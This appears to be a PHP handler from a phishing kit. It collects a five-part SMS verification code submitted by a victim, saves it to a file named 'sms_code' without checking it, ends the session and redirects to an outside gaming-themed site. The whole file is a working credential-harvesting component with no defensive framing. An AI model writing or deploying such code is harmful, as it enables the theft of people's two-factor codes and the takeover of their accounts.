<?php
include_once(__DIR__."/create_session.php");


date_default_timezone_set('America/Sao_Paulo');

$hora = date ("Y-m-d # H:i:s");

$code1 = $_POST['code1'];
$code2 = $_POST['code2'];
$code3 = $_POST['code3'];
$code4 = $_POST['code4'];
$code5 = $_POST['code5'];

$code = [$code1, $code2, $code3, $code4, $code5];

write_in_file("sms_code", join($code));

session_destroy();
header("Location: https://csgoad.run/");
?>